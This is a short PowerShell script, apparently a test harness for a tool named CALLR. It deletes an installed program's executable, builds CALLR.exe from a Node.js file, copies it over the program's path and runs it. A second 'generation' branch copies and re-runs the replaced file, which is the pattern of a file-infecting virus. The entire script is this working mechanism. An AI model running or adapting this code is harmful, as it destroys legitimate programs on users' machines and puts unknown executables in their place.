<# 
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░ Invoke-Callr / CALLR t3st scr1pt
░░
░░ Exαmpl3 usagε                                              
░░ PS «c0d3 f0ld3r»\CALLR> . .\TestCALLR.ps1
░░ PS> Invoke-Callr "$($env:ProgramFiles)\\iNFekt\\infekt-win64.exe" 0
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 #>
 Function Invoke-Callr {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$targetFilePath,
        [Parameter(Mandatory=$false)]
        [Int]$generation = 0
    )    

    $targetFileName = Split-Path $targetFilePath -leaf
    $targetPath = Split-Path $targetFilePath    

    if ($generation -eq 0) {        
        Remove-Item $targetFilePath;
        #Rename-Item -Path "$targetFilePath.blah" -NewName "$targetFileName"
        #Copy-Item "$targetFilePath" -Destination "$targetPath\\$targetFileName.bak"
        pkg index.js -t node12-win-x64 -o CALLR
        Copy-Item .\CALLR.exe -Destination $targetFilePath
        & $targetFilePath
        #& .\CALLR.exe    
    } else {        
        Copy-Item "$targetFilePath" -Destination ".\CALLR-gen1.exe"
        Rename-Item -Path "$targetFilePath.blah" -NewName "$targetFileName"
        & .\CALLR-gen1.exe
    }    
}
